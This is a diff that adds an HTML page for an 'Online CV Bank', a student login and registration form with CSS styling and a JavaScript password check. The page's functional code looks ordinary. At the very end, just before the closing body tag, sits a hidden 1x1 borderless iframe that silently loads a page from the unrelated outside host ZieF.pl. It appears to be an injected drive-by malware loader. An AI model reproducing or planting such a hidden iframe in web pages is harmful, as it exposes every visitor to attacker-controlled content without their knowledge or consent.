@@ -1,0 +1,209 @@
+<html>
+<head>
+ <title>Online CV Bank</title>
+</head>
+<style>
+ body
+ {
+  background-color: #C9BE62;
+ }
+ table
+ {
+  width: 95%;
+
+ }
+ header
+ {
+  width:102%;
+  top: 0px;
+  position:fixed;
+  margin-top:-31px;
+  margin-left: -10px;
+  /*position:absolute;*/
+  height: 100px;
+  background-color:#827839 ;
+
+ }
+ footer
+ {
+  position:fixed;
+  width:102%;
+  bottom: 0px;
+  
+  
+  margin-left: -10px;
+  
+  height: 70px;
+  background-color:#827839 ;
+
+ }
+
+
+
+
+  .top1
+  {
+    width: 350px; 
+     
+  }  
+ .font-style-top
+  {
+    font-size: 120%; 
+    color:#C8B560;
+    line-height: 2.5em;
+    margin-left: 7%;
+  }
+  .font-style-bottom
+  {
+    font-size: 90%; 
+    color:#C8B560;
+    line-height: 2.5em;
+    margin-left: 7%;
+  }
+ .body-text
+  {
+   font-size: 100%;
+   color:#805817;
+  }
+  .table-text
+  {
+   font-size: 100%;
+   color:#805817;
+   text-align: right;
+  
+  }  
+  .shadow
+   {
+     box-shadow:10px 10px 20px #4E4848;
+     -webkit-box-shadow:10px 10px 20px #4E4848;
+     -moz-box-shadpw:10px 10px 20px #4E4848;
+   }
+   .help
+   {
+    background-color: #FFFF73;
+    border-radius: 10px;
+    display: none;
+    opacity: 0.9;
+    padding: 10px;
+    z-index: 100;
+   }
+   .help_link:hover+span{
+     display: inline;
+   }
+  
+  /*  
+  .parentTable{
+    width: 100%;
+    border: 1px solid #b4b4b4;
+}
+.parentTable tr td{
+    padding: 5px 30px;
+}
+.parentTable tr td.header{
+    background: #265ca5;
+}
+.parentTable tr td.spec{
+    width: 1px;
+    padding: 0;
+    border: none;
+    background: #b4b4b4;
+}
+.childTable{
+    width: 100%;
+}
+.childTable tr td{
+    border-bottom: 1px dashed;
+}
+.childTable tr:last-child td{
+    border: none;
+}
+  */
+</style>  
+<script>  
+function emailCheck(str)
+{
+ var indexDot=str.lastIndexOf("@");
+ var len=str.length;
+ var str1=str.substring(indexDot,(len));
+if(indexDot==-1 || str1!="@students.becs.ac.in"){
+  return false;
+}
+  return true;
+}
+function validateForm()
+{
+var emailField=document.forms["logForm"]["email"].value;
+var passwordField=document.forms["logForm"]["password"].value;
+/*if(emailField=="" || emailCheck(emailField)==false)
+{
+ alert("Please enter a valid email id e.g. example@students.becs.ac.in");
+ return false;
+}*/
+if(passwordField=="")
+{
+ alert("Please enter your password");
+ 
+ return false;
+}
+
+return true;
+}
+</script>
+
+<body>
+ <!--HEADRER-->
+ <header>
+  <span>
+  <div class="top1">
+     <h2><p class="font-style-top">Online CV Bank</p></h2>
+  </div>
+ </span>   
+</header>
+<br><br><br><br>
+<!--MIDDLE-->
+ <table>
+  <tr>
+   <!--Login Side-->
+    <td valign="top" style="border-right: 1px solid #827839; padding: 5px;"> 
+   <table>  
+    <tr><td><h4><p class="table-text">Login To Your Account:</p></h4></td><td></td></tr>  
+    <tr></tr><tr></tr><tr></tr>
+    <form name="logForm" action="login.php" method="post" onSubmit="return validateForm();">
+    <tr>
+     <br>
+     <td><p class="table-text">Email ID:</p></td>
+      <td><input type="text" name="email" class="shadow" class="input_text" placeholder="example@students.becs.ac.in"/></td>
+    </tr>
+    <tr>
+     <td><p class="table-text">Password:</p></td>
+      <td><input type="password" name="password" class="shadow" class="input_text" placeholder="Your Password"/></td>
+    </tr>
+    <tr><td></td>
+    <td><input type="submit" value="Submit" class="shadow"/></td></tr>
+    </form>
+   </table>
+   </td>
+   <!--Registration Side-->
+   <td valign="top">
+     <table>
+      <form name="registration" action="register.php" method="post">
+      <tr><td><h4><p class="table-text">Registration:</p></h4></td><td></td></tr>
+      <tr></tr><tr></tr><tr></tr>
+       <tr><br><td><p class="table-text">Full Name:</p></td><td><input type="text" class="shadow" class="input_text" placeholder="Your Full Name" name="full_name" id="full_name"/></td></tr>
+       <tr><td><p class="table-text">College Registration No.:</p></td><td><input type="text" class="shadow input_text" placeholder="110510025" name="id_no" id="id_no"/></td></tr>
+        <tr><td><p class="table-text">Email ID:</p></td><td width="10" ><input type="text" class="shadow" class="input_text" placeholder="example" name="email" id="email"/></td><td><p style="align:left; font-size: 100%; color:#805817;">@students.becs.ac.in</p></td></tr>
+        <tr><td><p class="table-text">Password:</p></td><td><input type="password" class="shadow" class="input_text" placeholder="New Password" name="password" id="password"/></td></tr>
+        <tr><td></td><td><input type="submit" value="Submit" class="shadow"/></td></tr>
+       </form>
+    </table>
+   </td>
+  </tr>
+ </table>
+ <footer>
+  <p class="font-style-bottom">Developer: Subhasish Kundu, Gaurab Patra</p>
+
+ </footer>
+<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body>
+</html>
+
